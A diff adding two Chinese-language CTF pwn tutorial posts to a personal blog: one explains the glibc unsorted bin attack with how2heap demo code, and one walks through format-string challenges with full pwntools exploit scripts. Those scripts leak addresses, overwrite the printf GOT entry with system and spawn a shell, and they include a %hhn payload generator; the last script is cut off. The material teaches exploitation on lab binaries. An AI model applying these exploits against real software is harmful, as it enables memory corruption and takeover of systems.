@@ -138,7 +138,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -149,7 +149,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -166,6 +166,407 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/unsorterbin%20attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/06/17/unsorterbin%20attack/" class="post-title-link" itemprop="url">Unsorted Bin Attack</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 13:19:54 / Modified: 13:20:46" itemprop="dateCreated datePublished" datetime="2025-06-17T13:19:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <meta name="referrer" content="no-referrer" />
+
+<h1 id="unsorted-bin-Attack"><a href="#unsorted-bin-Attack" class="headerlink" title="unsorted bin Attack"></a>unsorted bin Attack</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>Unsorted bin attack 自然是作用于Unsorted bin的，该攻击手段适用的libc版本是<strong>2.27及以下</strong>。条件是能够修改Unsorted Bin Chunk 的bk指针，这个攻击达到的效果就是在目标位置写入一个很大的值（main_arena + 88）</p>
+<h2 id="2-原理剖析"><a href="#2-原理剖析" class="headerlink" title="2. 原理剖析"></a>2. 原理剖析</h2><p>在 glibc&#x2F;malloc&#x2F;malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">bck = victim-&gt;bk</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br></pre></td></tr></table></figure>
+<p>逐行来解释一下这个代码<br><code>victim = unsorted_chunks (av)-&gt;bk</code> ：将Unsorted Bin中的最后一个chunk给到victim<br><code>bck = victim-&gt;bk</code> ：将最后一个chunk的前一个ckunk给bck<br><code>unsorted_chunks (av)-&gt;bk = bck</code> ：让 main_arena 指向bck<br><code>bck-&gt;fd = unsorted_chunks (av</code>：将bck的fd指针修改为main_arena</p>
+<p>那么很显然，如果我们可以控制Unsorted Bin 中chunk 的 bk指针，我们就可以向其中写入一个地址</p>
+<blockquote>
+<p>*<em>注意：</em> 执行完 Unsorted Bin Attack 之后 Unsorted Bin 就损坏了，无法继续向里面放入chunk</p>
+</blockquote>
+<h2 id="3-应用示例"><a href="#3-应用示例" class="headerlink" title="3. 应用示例"></a>3. 应用示例</h2><p>我们用how2heap的源码进行演示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 程序开始时的提示信息</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">		   <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    fprintf(stderr, &quot;本程序演示如何通过 unsorted bin 攻击将一个大的无符号长整型值写入栈中。\n&quot;);</span></span><br><span class="line"><span class="comment">    fprintf(stderr, &quot;在实际攻击中，unsorted bin 攻击通常是为了进一步攻击做准备，例如修改 libc 中的全局变量 global_max_fast，以便进行 fastbin 攻击。\n\n&quot;);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stack_var=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;首先，我们看一下栈上想要覆盖的目标变量：\n&quot;);</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;%p: %ld\n\n&quot;, &amp;stack_var, stack_var);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *p=<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;现在，我们在堆上分配第一个正常内存块，地址为：%p\n&quot;, p);</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;再分配另一个正常的内存块，目的是避免在释放第一个内存块时，top chunk 与其合并。\n\n&quot;);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot;</span></span><br><span class="line">		   <span class="string">&quot;point to %p\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;我们现在已经释放了第一个内存块，它将被插入到 unsorted bin 中，其 bk 指针指向：%p\n&quot;, (void*)p[1]);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">	p[<span class="number">1</span>]=(<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var<span class="number">-2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n&quot;</span>,(<span class="type">void</span>*)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;现在模拟一个可以覆盖 victim-&gt;bk 指针的漏洞。\n&quot;);</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;我们将 victim-&gt;bk 写为目标地址减去 16（如果是 32 位机器，则应为目标地址减去 8）：%p\n\n&quot;, (void*)p[1]);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During this time, the target should have already been &quot;</span></span><br><span class="line">		   <span class="string">&quot;rewritten:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var, (<span class="type">void</span>*)stack_var);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对应中文：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;再次调用 malloc 来获取我们刚刚释放的内存块。在这个过程中，目标变量应该已经被改写了：\n&quot;);</span></span><br><span class="line"><span class="comment">	fprintf(stderr, &quot;%p: %p\n&quot;, &amp;stack_var, (void*)stack_var);</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure>
+<p>编译：<code>gcc unsorted_bin_attack.c -no-pie -g -i test</code></p>
+<p>我们通过gdb来调试一下这个程序<br>先来看看正常free后，Unsorted Bin中的情况<br><img src="https://img.picui.cn/free/2025/05/29/68373daadc105.png"><br>在来看一看修改后的情况<br><img src="https://img.picui.cn/free/2025/05/29/68373ef116ab0.png"><br>此时，目标地址+0x10的位置还是 0，我们执行malloc，触发 Unsorted Bin Attack 后看看这个位置<br><img src="https://img.picui.cn/free/2025/05/29/68373f6721e55.png"><br>可以看到，这个位置成功被我们修改成了 **main_arena + 88 **</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/17/fmt%E5%88%9D%E8%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Fa1lSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | PWN好难学">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/06/17/fmt%E5%88%9D%E8%AF%86/" class="post-title-link" itemprop="url">格式化字符串漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2025-06-17 13:05:54 / Modified: 13:18:01" itemprop="dateCreated datePublished" datetime="2025-06-17T13:05:54+08:00">2025-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <meta name="referrer" content="no-referrer" />
+
+<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><h2 id="一、知识储备"><a href="#一、知识储备" class="headerlink" title="一、知识储备"></a>一、知识储备</h2><h3 id="1-格式化字符串是什么"><a href="#1-格式化字符串是什么" class="headerlink" title="1. 格式化字符串是什么"></a>1. 格式化字符串是什么</h3><p>在C语言中，我们经常会使用到printf之类的函数来输出，printf函数的<strong>第一个参数就是一个格式化字符串</strong>。在格式化字符串中，我们可以使用占位符，指定格式，这些占位符用来替代后面的变量或者是数据。<br>例如：<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130621739.png" alt="image"><br>更多关于格式化字符串的教程可以<a target="_blank" rel="noopener" href="https://www.runoob.com/cprogramming/c-function-printf.html">这里</a>查看在此我就不过多说明了。</p>
+<h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h3><p>我们可以使用%数字+$的形式，指定参数相对于格式化字符串的偏移，我们来看看这个程序的运行结果<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130621729.png" alt="image"><br>传入参数的顺序没有变化，但是输出参数的顺序改变了。%4$s %3$s %2$s %1$s分别对应格式化字符串后面的第4、3、2、1个参数。<br>因此通过以上操作（在权限允许的范围内）我们就能够实现：</p>
+<ul>
+<li>任意地址泄露：<strong>使用%+数字+$</strong></li>
+<li>任意地址写入：<strong>%数字c%数字$n</strong></li>
+</ul>
+<h2 id="二、例题分析（题目附件放在文末）"><a href="#二、例题分析（题目附件放在文末）" class="headerlink" title="二、例题分析（题目附件放在文末）"></a>二、例题分析（题目附件放在文末）</h2><h3 id="1-babyfmt"><a href="#1-babyfmt" class="headerlink" title="1.babyfmt"></a>1.babyfmt</h3><p>拿到题目先检查保护措施并运行一遍。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130708114.png" alt="image-20250617130708065"><br>了解基本情况之后，我们用ida来看看程序的运行逻辑。main函数非常简单，只调用了一个dofunc函数。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130621723.png" alt="image"><br>程序的运行逻辑非常简单，只要<strong>v1等于100就可以getshell</strong>了。（当然，溢出的方法能做，这里主要讲格式化字符串的方法。）所以思路非常简单，我们只需要<strong>通过格式化字符串修改v1的值为100</strong>就可以了。<br>首先我们要获取rbp的位置，我们可以通过读取rbp中的值，然后再把<strong>拿到的值减去0x10就是当前rbp的值</strong>，然后再减去0x8就时我们要修改的内存部分了。我们先来动态调试看一下rbp相对于格式化字符串的位置。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130719430.png" alt="image-20250617130719383"><br>可以看到，<strong>rsp和rbp相距0x40</strong>字节，所以偏移就是<strong>5 + 64&#x2F;8 + 1 &#x3D; 14</strong>（5指的除了rdi之外的另外5个用于参数传递的寄存器），我们的payload1就构造好了。<br><code>payload1 = payload1 = b&#39;%14$p&#39;</code><br>然后我们接收，并<strong>将这个地址减去0x18</strong>就是<strong>rbp-8</strong>的地址了。拿到地址之后我们再通过<code>%100c%x$hhn</code>就能够修改这个地址的值了。下面，我们来计算处x的值。先如下构造payload2。<br><code>payload2 = b&quot;%100c%x$hhn&quot; +b&#39;a&#39;*0x5 + p64(rbp_8_addr)</code>(a用于对齐)然后gdb动调。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130731723.png" alt="image-20250617130731675"><br>那么<strong>x &#x3D; 5 + 48&#x2F;8 + 1 &#x3D; 12</strong>。所以payload2如下：<br><code>payload2 = b&quot;%100c%12$hhnaaaa&quot; + p64(rbp_8_addr)</code></p>
+<p>到此这道题就做完了。完整的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(log_level=<span class="string">&#x27;debug&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./babyfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io =process(<span class="string">&quot;./babyfmt&quot;</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    <span class="comment">#payload = b&#x27;a&#x27; * 0x18 + p64(100)</span></span><br><span class="line">    payload1 = <span class="string">b&#x27;%14$p&#x27;</span></span><br><span class="line">    io.sendafter(<span class="string">&quot;input:\n&quot;</span> , payload1)</span><br><span class="line"></span><br><span class="line">    stack = <span class="built_in">int</span>(io.recvline()[ <span class="number">2</span> : <span class="number">14</span>] , <span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span> , <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    value_addr = stack - <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&quot;%100c%12$hhnaaaa&quot;</span> + p64(value_addr)</span><br><span class="line">    io.send(payload2)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="2-fmt-str-level-1-x86"><a href="#2-fmt-str-level-1-x86" class="headerlink" title="2.fmt_str_level_1_x86"></a>2.fmt_str_level_1_x86</h3><p>拿到题目还是先查看一下保护措施，然后运行一下。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130622410.png" alt="image"><br>了解基本情况之后，我们用ida来看看程序的运行逻辑。main函数非常简单，只调用了一个dofunc函数，我们直接分析这个dofunc函数。<br><img src="https://gitee.com/Fa1lSnow/pic/raw/master/20250617130821407.png" alt="image-20250617130821365"></p>
+<p>这次没有system给我们跳转了，但是got表时可写的，所以我们可以通过<strong>修改printf函数的地址为system的地址</strong>然后参数传入**&#x2F;bin&#x2F;sh**来getshell。</p>
+<p>由于这道题开启了PIE所以我们无法直接从IDA读取地址，我们先通过格式化字符串漏洞泄露函数返回值的地址（就是main函数中 <code>call dofunc</code>之后的下一条指令）然后找到main函数的入口地址，main函数的入口地址减去<strong>main函数与printf函数的got表地址之间的偏移量</strong>就可以获得printf函数的got表的地址了。通过动态调试得知，dofunc函数的返回地址相对于格式化字符串的偏移为75（32位程序的计算直接数就好了，这里就不带着去找了），所以payload1如下：<br><code>payload1 = b&#39;%75$p&#39;</code><br>接收got表的地址并处理如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">main_addr = main_p30_addr - <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;main_addr:&quot;</span> , <span class="built_in">hex</span>(main_addr))</span><br><span class="line">offset = elf.symbols[<span class="string">&#x27;main&#x27;</span>] - elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got_addr = main_addr - offset</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;printf_got_addr:&quot;</span> , <span class="built_in">hex</span>(printf_got_addr))</span><br></pre></td></tr></table></figure>
+<p>下一步我们就是要读取printf的got表拿到printf函数的真实地址了，payload2如下：<br><code>payload2 = p32(printf_got_addr) + b&#39;%7$s\x00&#39;</code><br>接收到真实地址之后我们需要计算出<strong>system函数</strong>和**&#x2F;bin&#x2F;sh的地址**（和普通的libc题目一样），相关代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print_real_addr = u32(io.recv(<span class="number">8</span>)[ <span class="number">4</span> : <span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;print_real_addr:&quot;</span> , <span class="built_in">hex</span>(print_real_addr))</span><br><span class="line"></span><br><span class="line">libcbase = print_real_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libcbase + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr:&quot;</span> , <span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binshi_addr:&quot;</span> , <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>下一步我们需要通过%n改地址。但是由于地址是一个十分大的数字，<strong>直接使用%n改掉可能会引发崩溃</strong>，所以这里我们<strong>一个字节一个字节地改地址</strong>。老规矩，我们通过动调找到了第一个字节的地址相对于格式化字符串的偏移量位7，由于要修改4次地址，我们简单的写一个脚本帮我们构造payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">prev, word, index</span>):</span><br><span class="line">    fmtstr = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span><br><span class="line">    <span class="comment"># offset 偏移位置  size 32?64  addr写入地址   target 写入内容</span></span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<p>然后我们调用这个函数来生成payload3<br><code>payload3 = fmt_str( 7 , 4 , printf_got_addr , sys_addr)</code><br>最后我们只需要把**&#x2F;bin&#x2F;sh**传过去就可以了。payload4如下<br><code>payload4 = p32(binsh_addr)</code></p>
+<p>完整的exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def fmt(prev, word, index):</span><br><span class="line">    fmtstr = &quot;&quot;</span><br><span class="line">    if prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr += &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    elif prev == word:</span><br><span class="line">        result = 0</span><br><span class="line">    else:</span><br><span class="line">        result = 256 + word - prev</span><br><span class="line">        fmtstr = &quot;%&quot; + str(result) + &quot;c&quot;</span><br><span class="line">    fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot;</span><br><span class="line">    return 